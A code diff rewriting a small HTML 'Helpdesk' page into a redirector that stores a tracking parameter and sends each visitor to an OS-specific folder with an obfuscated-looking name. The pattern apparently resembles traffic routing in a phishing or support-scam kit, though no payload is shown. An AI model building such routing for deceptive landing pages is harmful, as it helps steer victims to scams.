@@ -3,71 +3,56 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Helpdesk</title>
+<title>Redirecting...</title>
 
 <script>
-function getQueryParam(param) { 
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get(param);
-}
+(function () {
 
-function checkOperatingSystem() {
-    const ua = navigator.userAgent;
-
-    if (/windows/i.test(ua)) return "Windows";
-    if (/android/i.test(ua)) return "Android";
-    if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
-    if (/mac/i.test(ua)) return "MacOS";
-    if (/linux/i.test(ua)) return "Linux";
-
-    return "Unknown";
-}
-
-window.onload = function () {
-
-    // Get query params safely
-    let alpha = getQueryParam('alpha');
-    let bcda = getQueryParam('bcda');
-
-    // Store alpha only if exists
-    if (alpha) {
-        localStorage.setItem('alpha', alpha);
+    // Get query parameter safely
+    function getParam(name) {
+        const params = new URLSearchParams(window.location.search);
+        return params.get(name) || "";
     }
 
-    // Prevent crash if bcda is null
-    if (!bcda) {
-        console.error("Missing 'bcda' parameter");
+    // Get parameters
+    var alpha = getParam("alpha");
+    var bcda = getParam("bcda");
+
+    // Store alpha if exists
+    if (alpha !== "") {
+        localStorage.setItem("alpha", alpha);
+    }
+
+    // If bcda missing → stop
+    if (bcda === "") {
+        document.body.innerHTML = "<h2 style='text-align:center;margin-top:50px;'>Invalid Link</h2>";
         return;
     }
 
-    bcda = bcda.trim();
+    // Detect OS (simple & reliable)
+    var ua = navigator.userAgent.toLowerCase();
+    var url = "";
 
-    // Detect OS
-    let os = checkOperatingSystem();
-
-    // Redirect based on OS
-    let basePath = "";
-
-    switch (os) {
-        case "MacOS":
-            basePath = "MerxiC0deinfousahtml/index.html";
-            break;
-        case "Android":
-            basePath = "andx010usahTml/index.html";
-            break;
-        case "iOS":
-            basePath = "ioxs010usxhYMl/index.html";
-            break;
-        default:
-            basePath = "webC0deinfousavhtml/index.html";
+    if (ua.includes("android")) {
+        url = "andx010usahTml/index.html";
+    } else if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) {
+        url = "ioxs010usxhYMl/index.html";
+    } else if (ua.includes("mac")) {
+        url = "MerxiC0deinfousahtml/index.html";
+    } else {
+        url = "webC0deinfousavhtml/index.html";
     }
 
-    // Final redirect
-    window.location.href = basePath + "?bcda=" + encodeURIComponent(bcda);
-};
+    // Redirect
+    window.location.replace(url + "?bcda=" + encodeURIComponent(bcda));
+
+})();
 </script>
 
 </head>
 <body>
+
+<p style="text-align:center;margin-top:50px;">Redirecting...</p>
+
 </body>
 </html>
